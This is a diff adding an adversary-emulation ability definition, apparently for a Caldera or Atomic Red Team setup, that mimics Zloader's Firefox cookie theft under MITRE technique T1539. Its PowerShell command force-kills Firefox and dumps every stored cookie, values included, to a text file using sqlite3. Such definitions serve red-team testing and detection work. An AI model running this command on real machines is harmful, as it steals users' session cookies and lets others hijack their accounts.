@@ -1,0 +1,26 @@
+---
+- id: d54bcaf2e58f6d95da2a54dcb5853a57
+  name: Steal Firefox Cookies (Windows)
+  description: "This test queries Firefox's cookies.sqlite database to steal the cookie\
+    \ data contained within it, similar to Zloader/Zbot's cookie theft function. \n\
+    Note: If Firefox is running, the process will be killed to ensure that the DB\
+    \ file isn't locked. \nSee https://www.malwarebytes.com/resources/files/2020/05/the-silent-night-zloader-zbot_final.pdf.\
+    \ \n"
+  tactic: credential-access
+  technique:
+    attack_id: T1539
+    name: Steal Web Session Cookie
+  platforms:
+    windows:
+      psh:
+        command: stop-process -name "firefox" -force -erroraction silentlycontinue;
+          $CookieDBLocation = get-childitem -path "$env:appdata\Mozilla\Firefox\Profiles\*\cookies.sqlite";
+          "select host, name, value, path, expiry, isSecure, isHttpOnly, sameSite
+          from [moz_cookies];" | cmd /c PathToAtomicsFolder\..\ExternalPayloads\sqlite-tools-win32-x86-3380200\sqlite3.exe
+          "$CookieDBLocation" | out-file -filepath "PathToAtomicsFolder\..\ExternalPayloads\T1539FirefoxCookies.txt"
+        payloads: []
+        cleanup: remove-item PathToAtomicsFolder\..\ExternalPayloads\T1539FirefoxCookies.txt
+          -erroraction silentlycontinue
+        parsers:
+          plugins.atomic.app.parsers.atomic_powershell:
+          - source: validate_me
